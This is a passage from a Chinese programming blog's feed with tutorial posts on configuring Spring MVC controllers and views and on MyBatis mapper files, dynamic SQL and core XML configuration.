class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="创建和配置controller类-1"><a href="#创建和配置controller类-1" class="headerlink" title="创建和配置controller类"></a>创建和配置controller类</h3><p>使用Controller注解声明该类为controller类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testController</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/testReturnMsg&quot;)</span>    <span class="hljs-meta">@ResponseBody</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test01</span><span class="hljs-params">(String msg)</span>&#123;        System.out.println(<span class="hljs-string">&quot;springmvc method running...&quot;</span>);        <span class="hljs-keyword">return</span> msg;    &#125;&#125;</code></pre></div><h3 id="创建和配置config类"><a href="#创建和配置config类" class="headerlink" title="创建和配置config类"></a>创建和配置config类</h3><p>创建SpringMvcConfig类并实现WebMvcConfigurer接口</p><p>使用Configuration注解声明该类为配置类</p><p>使用ComponentScan注解扫描controller类的包路径</p><p>使用EnableWebMvc开启springmvc</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-meta">@ComponentScan(basePackages = &quot;com.pacemrc.springmvcDemo.controller&quot;)</span><span class="hljs-meta">@EnableWebMvc</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;&#125;</code></pre></div><p><strong>配置自定义视图解析</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureViewResolvers</span><span class="hljs-params">(ViewResolverRegistry registry)</span> &#123;registry.jsp().prefix(<span class="hljs-string">&quot;/page/&quot;</span>).suffix(<span class="hljs-string">&quot;.jsp&quot;</span>);&#125;</code></pre></div><p><strong>配置静态资源访问</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;registry.addResourceHandler(<span class="hljs-string">&quot;/static/**&quot;</span>).addResourceLocations(<span class="hljs-string">&quot;classpath:/static/&quot;</span>);&#125;</code></pre></div><h3 id="创建和配置init初始化类"><a href="#创建和配置init初始化类" class="headerlink" title="创建和配置init初始化类"></a>创建和配置init初始化类</h3><p>在getServletConfigClasses方法中指定springmvc的配置类</p><p>在getServletMappings方法中指定servlet的映射路径</p><p>（其中getRootConfigClasses方法用于指定spring的配置类）</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppInitializer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; SpringMvcConfig.class &#125;;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> String[] getServletMappings() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;/&quot;</span> &#125;;    &#125;&#125;</code></pre></div><h3 id="配置tomcat运行web服务-1"><a href="#配置tomcat运行web服务-1" class="headerlink" title="配置tomcat运行web服务"></a>配置tomcat运行web服务</h3><h1 id="视图解析"><a href="#视图解析" class="headerlink" title="视图解析"></a>视图解析</h1><h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/testModel&quot;)</span><span class="hljs-keyword">public</span> String <span class="hljs-title function_">test03</span><span class="hljs-params">(String msg,Model model)</span>&#123;model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,msg);<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/page2.jsp&quot;</span>;&#125;</code></pre></div><p>page2.jsp 使用EL表达式获取变量</p><div class="code-wrapper"><pre><code class="hljs jsp">&lt;%@ page isELIgnored=<span class="hljs-string">&quot;false&quot;</span> contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Page2&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Page2&lt;/h1&gt;&lt;p&gt;$&#123;msg&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h2 id="ModelAndView"><a href="#ModelAndView" class="headerlink" title="ModelAndView"></a>ModelAndView</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/testModelAndView&quot;)</span><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">test04</span><span class="hljs-params">(String msg, ModelAndView modelAndView)</span>&#123;modelAndView.addObject(<span class="hljs-string">&quot;msg&quot;</span>,msg);modelAndView.setViewName(<span class="hljs-string">&quot;/page3.jsp&quot;</span>);<span class="hljs-keyword">return</span> modelAndView;&#125;</code></pre></div><p>page3.jsp 使用EL表达式获取变量值</p><div class="code-wrapper"><pre><code class="hljs jsp">&lt;%@ page isELIgnored=<span class="hljs-string">&quot;false&quot;</span> contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;page3&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;ModelAndView&lt;/h1&gt;&lt;p&gt;$&#123;msg&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Mybatis实操</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Mybatis%E5%AE%9E%E6%93%8D/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Mybatis%E5%AE%9E%E6%93%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="基于配置文件方式开发"><a href="#基于配置文件方式开发" class="headerlink" title="基于配置文件方式开发"></a>基于配置文件方式开发</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.37<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div><h2 id="创建实体类数据库表"><a href="#创建实体类数据库表" class="headerlink" title="创建实体类数据库表"></a>创建实体类数据库表</h2><p>创建user表</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230206150752919.png"></p><h2 id="创建数据表对应java类"><a href="#创建数据表对应java类" class="headerlink" title="创建数据表对应java类"></a>创建数据表对应java类</h2><p>创建user类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.domain;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;    <span class="hljs-keyword">private</span> String name;    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> money;    <span class="hljs-keyword">private</span> Date birthday;    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getBirthday</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> birthday;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBirthday</span><span class="hljs-params">(Date birthday)</span> &#123;        <span class="hljs-built_in">this</span>.birthday = birthday;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;        <span class="hljs-built_in">this</span>.id = id;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;        <span class="hljs-built_in">this</span>.name = name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMoney</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> money;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMoney</span><span class="hljs-params">(<span class="hljs-type">int</span> money)</span> &#123;        <span class="hljs-built_in">this</span>.money = money;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> + <span class="hljs-string">&quot;id=&quot;</span> + id + <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> + <span class="hljs-string">&quot;, money=&quot;</span> + money + <span class="hljs-string">&quot;, birthday=&quot;</span> + birthday + <span class="hljs-string">&#x27;&#125;&#x27;</span>;    &#125;&#125;</code></pre></div><h2 id="创建Dao层mapper接口"><a href="#创建Dao层mapper接口" class="headerlink" title="创建Dao层mapper接口"></a>创建Dao层mapper接口</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mapper;<span class="hljs-keyword">import</span> com.example.domain.User;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span>;    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">queryUserById</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>;    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getAllUser</span><span class="hljs-params">()</span>;&#125;</code></pre></div><h2 id="创建mapper接口映射文件"><a href="#创建mapper接口映射文件" class="headerlink" title="创建mapper接口映射文件"></a>创建mapper接口映射文件</h2><h3 id="配置文件标签"><a href="#配置文件标签" class="headerlink" title="配置文件标签"></a>配置文件标签</h3><h3 id="约束头"><a href="#约束头" class="headerlink" title="约束头"></a>约束头</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></code></pre></div><h3 id="根标签"><a href="#根标签" class="headerlink" title="根标签"></a>根标签</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></code></pre></div><h3 id="根标签属性"><a href="#根标签属性" class="headerlink" title="根标签属性"></a>根标签属性</h3><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">namespace</span>：根标签的唯一限定名</code></pre></div><h3 id="子标签"><a href="#子标签" class="headerlink" title="子标签"></a>子标签</h3><table><thead><tr><th>子标签名称</th><th>功能</th></tr></thead><tbody><tr><td>select</td><td>查询语句</td></tr><tr><td>delete</td><td>删除语句</td></tr><tr><td>update</td><td>修改语句</td></tr><tr><td>insert</td><td>插入语句</td></tr><tr><td>cache</td><td></td></tr><tr><td>cache-ref</td><td></td></tr><tr><td>parameterMap</td><td></td></tr><tr><td>resultMap</td><td></td></tr><tr><td>sql</td><td>sql语句片段抽取</td></tr></tbody></table><h3 id="子标签属性"><a href="#子标签属性" class="headerlink" title="子标签属性"></a>子标签属性</h3><table><thead><tr><th>属性名</th><th>含义</th></tr></thead><tbody><tr><td>id</td><td>子标签的唯一限定名</td></tr><tr><td>parameterType</td><td>指定传入的参数的类型</td></tr><tr><td>resultType</td><td>指定查询语句的结果类型</td></tr><tr><td>parameterMap</td><td></td></tr><tr><td>resultMap</td><td></td></tr><tr><td>databaseId</td><td></td></tr><tr><td>fetchSize</td><td></td></tr><tr><td>flushCache</td><td></td></tr><tr><td>lang</td><td></td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="⭐动态SQL"><a href="#⭐动态SQL" class="headerlink" title="⭐动态SQL"></a>⭐动态SQL</h3><p>根据用户输入或外部条件动态组合的SQL语句块。</p><h3 id="all"><a href="#all" class="headerlink" title="all"></a>all</h3><table><thead><tr><th>元素</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>if</td><td>判断语句</td><td>单条件分支判断</td></tr><tr><td>choose(when、otherwise)</td><td>相当于java中的switch case语句</td><td>多条件分支判断</td></tr><tr><td>foreach</td><td>循环语句</td><td>常用在in语句等列举条件中</td></tr><tr><td>trim，where</td><td>辅助元素</td><td>用于除里一些SQL拼装问题</td></tr><tr><td>bind</td><td>辅助元素</td><td>拼接参数</td></tr></tbody></table><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>对业务提交的数据进行判断，动态地生成需要执行的SQL语句</p><p>select * from user where id&#x3D;#{id} and name&#x3D;#{name} and money&#x3D;#{money};</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserByCondition&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span>    select * from user    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;id!=0&quot;</span>&gt;</span>            id=#&#123;id&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name!=null&quot;</span>&gt;</span>            and name=#&#123;name&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;money!=0&quot;</span>&gt;</span>            and money=#&#123;money&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></div><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p>select * from user where id in (1,2,3);</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserByCollection&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;list&quot;</span> &gt;</span>    select * from user    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;list&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;id in(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span>&gt;</span>            #&#123;id&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></div><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;userMapper&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span>&gt;</span>select * from user where id = #&#123;id&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryAll&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span>select * from user;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertOne&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span>insert into user values(#&#123;id&#125;,#&#123;name&#125;,$&#123;money&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateById&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span>&gt;</span>update user set money = #&#123;money&#125; where id=#&#123;id&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteByName&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>delete from user where name = #&#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></code></pre></div><h2 id="创建数据库连接信息文件"><a href="#创建数据库连接信息文件" class="headerlink" title="创建数据库连接信息文件"></a>创建数据库连接信息文件</h2><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">jdbc.driver</span>=com.mysql.jdbc.Driver<span class="hljs-attr">jdbc.url</span>=jdbc:mysql://localhost:<span class="hljs-number">3306</span>/test<span class="hljs-attr">jdbc.username</span>=root<span class="hljs-attr">jdbc.password</span>=<span class="hljs-number">123456</span></code></pre></div><h2 id="创建xml核心配置文件"><a href="#创建xml核心配置文件" class="headerlink" title="创建xml核心配置文件"></a>创建xml核心配置文件</h2><h3 id="配置文件介绍"><a href="#配置文件介绍" class="headerlink" title="配置文件介绍"></a>配置文件介绍</h3><h3 id="约束头-1"><a href="#约束头-1" class="headerlink" title="约束头"></a>约束头</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></code></pre></div><h3 id="根标签-1"><a href="#根标签-1" class="headerlink" title="根标签"></a>根标签</h3><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;configuration&gt;</span><span class="hljs-section">&lt;/configuration&gt;</span></code></pre></div><h3 id="子标签-1"><a href="#子标签-1" class="headerlink" title="子标签"></a>子标签</h3><h3 id="all-1"><a href="#all-1" class="headerlink" title="all"></a>all</h3><ul><li><strong>号为常用标签</strong></li></ul><table><thead><tr><th>子标签名称</th><th>功能</th></tr></thead><tbody><tr><td>properties</td><td>加载外部的properties文件</td></tr><tr><td>environments</td><td>数据源环境，</td></tr><tr><td>databaseIdProvider</td><td>数据库厂商标识，</td></tr><tr><td>mappers</td><td>加载映射配置，</td></tr><tr><td>objectFactory</td><td>对象工厂，</td></tr><tr><td>objectWrapperFactory</td><td>对象包装工厂，</td></tr><tr><td>plugins</td><td>插件，</td></tr><tr><td>reflectorFactory</td><td>反射器工厂，</td></tr><tr><td>settings</td><td>设置，</td></tr><tr><td>typeAliases</td><td>类型别名，</td></tr><tr><td>typeHandlers</td><td>类型处理器，</td></tr></tbody></table><h3 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h3><p>properties存在子标签property</p><table><thead><tr><th>父标签</th><th>属性名</th><th>功能</th></tr></thead><tbody><tr><td>properties</td><td>resource</td><td>从项目的resources文件夹内加载资源</td></tr><tr><td></td><td>url</td><td>从远程URL加载资源</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;http://xxxx/jdbc.properties&quot;</span>/&gt;</span></code></pre></div><h3 id="environments"><a href="#environments" class="headerlink" title="environments"></a>environments</h3><table><thead><tr><th>父标签</th><th>子标签1</th><th>子标签2</th><th>子标签3</th><th>属性</th><th>可选值</th><th>属性功能</th></tr></thead><tbody><tr><td>environments</td><td></td><td></td><td></td><td>default</td><td>development</td><td>指定默认的环境名称</td></tr><tr><td></td><td>environment</td><td></td><td></td><td>id</td><td></td><td>指定当前环境的名称</td></tr><tr><td></td><td></td><td>transactionManager</td><td></td><td>type</td><td>JDBC</td><td>指定事务管理器</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td>MANAGED</td><td></td></tr><tr><td></td><td></td><td>dataSource</td><td></td><td>type</td><td>POOLED</td><td>指定数据源类型</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td>UNPOOLED</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td>JNDI</td><td></td></tr><tr><td></td><td></td><td></td><td>property</td><td>name</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>value</td><td></td><td>可使用el表达式设置值</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transactionManager</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span></code></pre></div><h3 id="mappers"><a href="#mappers" class="headerlink" title="mappers"></a>mappers</h3><table><thead><tr><th>父标签</th><th>子标签1</th><th>属性名</th><th>属性功能</th></tr></thead><tbody><tr><td>mappers</td><td>mapper</td><td>resource</td><td>使用相对于类路径的资源引用</td></tr><tr><td></td><td></td><td>url</td><td>使用完全限定资源定位符（URL）</td></tr><tr><td></td><td></td><td>class</td><td>使用映射器接口实现类的完全限定类名</td></tr><tr><td></td><td>package</td><td>name</td><td>将包内所有的映射器接口全部注册为映射器</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;org/mybatis/builder/AuthorMapper.xml&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;file:///var/mappers/AuthorMapper.xml&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.mybatis.builder.AuthorMapper&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;org.mybatis.builder&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span></code></pre></div><h3 id="typeAliases"><a href="#typeAliases" class="headerlink" title="typeAliases"></a>typeAliases</h3><table><thead><tr><th>父标签</th><th>子标签1</th><th>属性名</th><th>属性功能</th></tr></thead><tbody><tr><td>typeAliases</td><td>typeAlias</td><td>type</td><td>需要指定类（类全限定名）</td></tr><tr><td></td><td></td><td>alias</td><td>别名的名称</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">typeAlias</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;org.example.domain.User&quot;</span> <span class="hljs-attr">alias</span>=<span class="hljs-string">&quot;user&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span></code></pre></div><h3 